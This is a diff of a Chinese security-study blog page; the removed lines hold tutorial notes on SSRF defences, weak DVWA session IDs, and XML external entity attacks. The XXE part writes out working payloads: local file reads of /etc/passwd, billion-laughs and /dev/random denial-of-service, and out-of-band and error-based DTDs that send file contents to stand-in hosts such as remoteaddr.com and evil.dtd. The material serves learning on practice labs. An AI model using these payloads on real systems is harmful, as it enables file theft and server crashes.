-<li>服务端需要鉴权（Cookies &amp; User: Pass）不能完美利用</li>
-<li>限制请求的端口为 http 常用的端口，比如，80, 443, 8080, 8090.</li>
-<li>禁用不需要的协议,仅仅允许 http 和 https 请求。可以防止类似于 <code>file://,gopher://,ftp://</code> 等引起的问题。</li>
-<li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态.</li>
-</ol>
-<h3 id="0x03-session伪造"><a href="#0x03-session伪造" class="headerlink" title="0x03 session伪造"></a>0x03 session伪造</h3><h4 id="session简介和常见session的问题"><a href="#session简介和常见session的问题" class="headerlink" title="session简介和常见session的问题"></a>session简介和常见session的问题</h4><p>Session 会话机制是一种服务器端机制，它使用类似于哈希表（可能就是哈希表）的结构来保存信息。当程序需要为客户端的请求创建会话时，服务器首先检查客户端的请求是否包含会话标识符（称为会话ID）。如果包含它，它先前已为此客户端创建了一个会话。服务器根据会话ID检索会话（无法检索，将创建新会话），如果客户端请求不包含会话ID，则为客户端创建会话并生成与会话关联的会话ID。 Seeion ID 应该是一个既不重复也不容易被复制的字符串。会话ID将返回给客户端以保存此响应。</p>
-<p>session如果使用不当依然会造成严重的安全问题，主要有：</p>
-<ol>
-<li>会话预测: 即 Session ID 生成方式太简单，能够被预测. 攻击者可以预测有效的 Session ID 并获得对应用程序的访问权限.</li>
-<li>会话劫持: 通过利用各种手段获取用户 Session ID 后，使用该 Session ID 登录网站，获取目标用户的操作权限.</li>
-<li>会话重用: 服务器端Session未失效，攻击者可利用此Session向服务器继续发送服务请求. 测试方法：登录后将会话注销，再次重放登录时的数据包仍然可正常登录系统.</li>
-<li>会话失效时间过长: Session ID 的保存是比较麻烦，有的应用将 Session ID 的失效时间设置得过长，不仅增大服务器的负荷，还导致同一个 Session ID 可以被多次利用。 测试方法：系统登录后会话长时间不失效，使用系统功能，仍可正常使用。</li>
-<li>会话固定: 在用户进入登录页面，但还未登录时，就已经产生了一个 Session ID，用户输入信息，登录以后，Session ID 不会改变，也就是说没有建立新会话，原来的会话也没有被销毁. 测试方法：系统登录前和登录后，用户的 Session ID 保持不变。</li>
-</ol>
-<h4 id="DVWA-复现"><a href="#DVWA-复现" class="headerlink" title="DVWA 复现"></a>DVWA 复现</h4><h5 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h5><p>点Generate发现Http Header里的cookie值：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: dvwaSession&#x3D;1; PHPSESSID&#x3D;sml91451sl2vms4iftcson2fm2; security&#x3D;low</span><br></pre></td></tr></table></figure>
-
-<p>再点一下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: dvwaSession&#x3D;2; PHPSESSID&#x3D;sml91451sl2vms4iftcson2fm2; security&#x3D;low</span><br></pre></td></tr></table></figure>
-
-<p>太明显了，dvwaSession每次加一。</p>
-<h5 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h5><p>点击后查看cookie：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: dvwaSession&#x3D;1594535470; PHPSESSID&#x3D;lmf4ka7t6ofsau9um2nl3jjsc7; security&#x3D;mediu</span><br></pre></td></tr></table></figure>
-
-<p>还是太明显了…时间戳。</p>
-<h5 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h5><p>点击后查看cookie：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: dvwaSession&#x3D;c4ca4238a0b923820dcc509a6f75849b; PHPSESSID&#x3D;lmf4ka7t6ofsau9um2nl3jjsc7; security&#x3D;high</span><br></pre></td></tr></table></figure>
-
-<p>这回不那么明显了，不过看着像md5，解密一下<a target="_blank" rel="noopener" href="https://www.cmd5.com,发现就是数字从1递增,加了一层md5.....还是没有安全性可言./">https://www.cmd5.com，发现就是数字从1递增，加了一层md5.....还是没有安全性可言。</a></p>
-<h5 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h5><p>这回解密发现无法成功了。查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    $cookie_value = sha1(mt_rand() . time() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这回session的生成基本是无法破解了，将随机数，时间和 <code>Impossible</code> 凭借生成的字符串再加强 Hash. 而且采用比较安全的 POST 型提交, 减少 GET 型带来的潜在风险。这个方法是安全的。</p>
-
+          <p>今天学习的内容是csrf，ssrf，session伪造这三个内容。复现平台dvwa&amp;pikachu。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/08/28/csrf-ssrf-session%E4%BC%AA%E9%80%A0/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -732,7 +503,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-08-28 10:47:56 / Modified: 10:48:10" itemprop="dateCreated datePublished" datetime="2020-08-28T10:47:56+08:00">2020-08-28</time>
+              <time title="Created: 2020-08-28 10:47:56 / Modified: 13:43:59" itemprop="dateCreated datePublished" datetime="2020-08-28T10:47:56+08:00">2020-08-28</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -759,152 +530,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="xxe基础"><a href="#xxe基础" class="headerlink" title="xxe基础"></a>xxe基础</h2><p>今天学习一下xxe相关的内容。</p>
-<h3 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h3><h5 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h5><p>XML 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage, XML）, 单单从其代码格式上来说，与 HTML 非常相似. 但是 XML 与 HTML 有很大的差异，主要在于：</p>
-<ol>
-<li>HTML 被设计用来显示数据，其焦点是数据的外观。XML 被设计用来传输和存储数据，其焦点是数据的内容.</li>
-<li>XML 大小写敏感，HTML 不敏感.</li>
-<li>XML 不允许任何错误，HTML 可以容忍小错误. 总体上来说，XML 语法更严格.</li>
-<li>XML 可以自定义标签，HTML 标签预定义.</li>
-<li>XML 可以动态处理，HTML 是静态的.</li>
-</ol>
-<h5 id="xml实体和dtd"><a href="#xml实体和dtd" class="headerlink" title="xml实体和dtd"></a>xml实体和dtd</h5><p>HTML 有许多预定义的实体，例如 : <code>&lt;</code> 代表 <code>&lt;</code>, <code>&quot;</code> 代表 <code>&quot;</code> 等等.</p>
-<p>XML 的灵活性更强，允许用户定义实体. DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
-<p>DTD的声明：指XML文档中声明该文档的DTD或DTD来源的部分，可以包含在使用它的XML文档内部，也可以以独立的DTD文档（*.dtd）文档存在.</p>
-<blockquote>
-<p>所以DTD一般认为有两种调用或声明方式：</p>
-<ol>
-<li>内部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中.</li>
-<li>外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中.</li>
-</ol>
-<p>网上有提到的调用公共DTD其实也算外部调用DTD的一种.</p>
-</blockquote>
-<p>一般内部 DTD 定义格式如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后就可以使用 <code>&amp;myentity;</code> 来使用它.</p>
-<p>XML 外部实体 (XML External Entity) 是一种自定义实体，而其定义在某个外部文件中. 定义 XML 外部实体要用到 <code>SYSTEM</code> 关键字，并且指定一个其对应的 URL 地址以供加载. 例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http:&#x2F;&#x2F;normal-website.com&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里的 URL 也可以用 <code>file://</code> 协议来访问本地文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>XXE 就是利用 DTD 进行外部文件访问。</p>
-<p>图：不同平台支持的协议<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt="不同平台支持的协议"></p>
-<p>这里不仅仅可以利用 <code>file://</code>, 还可以利用注入 <code>php://input</code> 之类的伪协议。</p>
-<p>ps.一个文档的示例：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DTD，这部分可选的--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span>                                                                          </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="something-important"><a href="#something-important" class="headerlink" title="something important"></a>something important</h5><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）。</p>
-<p><strong>1.通用实体</strong></p>
-<p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
-<p><strong>示例代码：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;&#x2F;firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;&#x2F;lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;&#x2F;updateProfile&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>2.参数实体：</strong></p>
-<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
-<p><strong>示例代码：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
-
-<p><strong>抛转：</strong></p>
-<p>参数实体在我们 Blind XXE 中起到了至关重要的作用。</p>
-<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><h4 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a>文件访问</h4><p>借助这个漏洞可以实现本地敏感文件访问。</p>
-<h4 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h4><h5 id="第一种-DOS-攻击"><a href="#第一种-DOS-攻击" class="headerlink" title="第一种 DOS 攻击"></a>第一种 DOS 攻击</h5><p>ps. 严格地说，这一种攻击只能算<strong>内部XML 实体攻击</strong>，不算 XXE (外部实体攻击).</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol</span> <span class="meta-string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol2</span> <span class="meta-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol3</span> <span class="meta-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol4</span> <span class="meta-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span> &gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>很显然，每个 loln+1 都包含相同个数的 loln，对应的字符串指数级的增长. 以上例，一旦使用 <code>&amp;lol9;</code>，就会占用 3GB 左右的内存，导致服务器内存超出而崩溃。</p>
-<h5 id="第二种-DOS-攻击"><a href="#第二种-DOS-攻击" class="headerlink" title="第二种 DOS 攻击"></a>第二种 DOS 攻击</h5><p>这种攻击主要针对 Unix/类Unix 服务器. 如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><blockquote>
-<p>服务器端请求伪造 (Server-side request forgery, SSRF) 是只攻击者利用漏洞使得服务器端的应用连接到攻击者设定的地址.</p>
-<p>一般地，攻击者会让被攻击的服务器访问自身，或者与服务器位于同一防火墙内的服务器，或外部第三方服务器.</p>
-<p>成功的服务器端请求伪造通常会导致攻击者访问（同一机构或自身）敏感数据或敏感应用，某些情况下，还可能导致任意指令执行.</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://internal.xxx.com/&quot;</span>&gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h4><p>很多情况下，XXE 攻击是不带回显的，因此不能直接访问服务器端文件，这使得 XXE 攻击难度增大.</p>
-<p>一般有三种方法实现 Blind XXE:</p>
-<ol>
-<li>out-of-band (OAST), 用外部服务器来接收返回内容.</li>
-<li>故意构造 XML 错误，从 XML Parser 的错误信息中获取敏感信息.</li>
-<li>一个变种：重利用本地 DTD 文件.</li>
-</ol>
-<h4 id="Out-Of-Band-攻击"><a href="#Out-Of-Band-攻击" class="headerlink" title="Out-Of-Band 攻击"></a>Out-Of-Band 攻击</h4><p>1.判断是否 XXE 攻击成功</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">oob</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://remoteaddr.com&quot;</span>&gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>攻击者可以监视 HTTP 请求和 DNS 请求来判断 XXE 攻击是否成功.<br>一般的 XML 自定义实体只能在<strong>文档中</strong>调用后才能起效，如果攻击者不能调用自定义实体，或者没有回显，普通的实体攻击就失效了. 这个时候，就要使用 <strong>XML 参数实体</strong>了.<br>XML 参数实体是一种特殊的 XML 实体，它<strong>只能</strong>在 <strong>DTD 内</strong>被调用. 对于 XML 参数，有两点必须注意:</p>
-<ul>
-<li>定义参数实体时%要在实体名前:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>用参数实体时也必须要带%:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;remoteaddr.com&quot;&gt; %xxe; ]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>2.利用 Out-Of-Band 获取文件 </p>
-<p>一个利用的 Out-Of-Band XXE 攻击读取 <code>/etc/passwd</code> 的 DTD 例子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;remoteaddr.com&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
-
-<p>这个例子中 DTD 做了这几件事：</p>
-<ul>
-<li>定义参数实例 <code>file</code>, 其内容为 <code>/etc/passwd</code> 的内容.</li>
-<li>定义参数实例eval, 它包含了一个动态的 XML 参数实例定义exfiltrate，这个exfiltrate会向攻击者的服务器发送包含 <code>file</code> (<code>/etc/passwd</code>) 内容的 HTTP 请求.</li>
-<li>调用 <code>%eval</code> 使得 <code>exfiltrate</code> 被动态地定义.</li>
-<li>调用 <code>%exfiltrate</code> 使得服务器发送相关内容.</li>
-</ul>
-<p>以上的 DTD 必须保存在<strong>攻击者的服务器上</strong>以供<strong>被攻击服务器</strong>访问. 这里，我们假设其地址为 <code>http://remoteaddr.com/malicious.dtd</code>.</p>
-<p>此时，攻击者可以向服务器提交恶意代码:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://remoteaddr.com/malicious.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这个 Payload 定义了一个参数实体 <code>xxe</code>，并且使得 XML Parser 获取远程的恶意 DTD，并动态执行，最后发送 <code>/etc/passwd</code>.</p>
-<p>ps1. 如果 XML Parser 对外部实体的具体内容进行过滤，Out-Of-Band 攻击可能不一定奏效，因为一些文件里的特殊符号会触发过滤机制. 这个时候就最好使用 FTP 协议. 另外，如果文件包含<strong>换行符</strong>则不能被读取.</p>
-<p>ps2. 参考文献提示可以在 DTD 中用 ` 包裹来防止 XML Parser 解析:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--服务端--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--all 在远程--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- eval.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="错误信息型攻击"><a href="#错误信息型攻击" class="headerlink" title="错误信息型攻击"></a>错误信息型攻击</h4><p>如果攻击者可以看见 XML Parser 返回的错误信息，则可以使用这种方法.</p>
-<p>外部 DTD Payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
-
-<p>这个 Payload 与之前的 out-of-band 不同之处在于 <code>eval</code> 中的 <code>error</code>. 调用 <code>%error</code> 会使得 XML Parser 访问一个不存在的地址，从而引发错误，而这个错误文件的地址里包含了敏感信息.</p>
-<h3 id="0x02-寻找注入点"><a href="#0x02-寻找注入点" class="headerlink" title="0x02 寻找注入点"></a>0x02 寻找注入点</h3><h5 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h5><p>有的时候，客户端向服务端提交数据，并嵌入到服务端的 XML 文档中，整合后再读取分析, 比如简单对象访问协议 (SOAP).</p>
-<p>这种情况下，你不能直接修改 <code>DOCTYPE</code> 元素，经典的 XXE 攻击无法执行. 这时则需要 <code>XInclude</code> 攻击.</p>
-<p><code>XInclude</code> 属于 XML 的说明部分，允许 XML 文件包含其他文件，就像 php 里的 <code>include()</code>. <code>XInclude</code> 可以出现在 XML 任何地方，因此可以使用 <code>XInclude</code> 攻击。</p>
-<p>实施一个 <code>XInclude</code> 攻击，你需要引用 <code>XInclude</code> 命名空间，并且指定你想要包含的文件地址:</p>
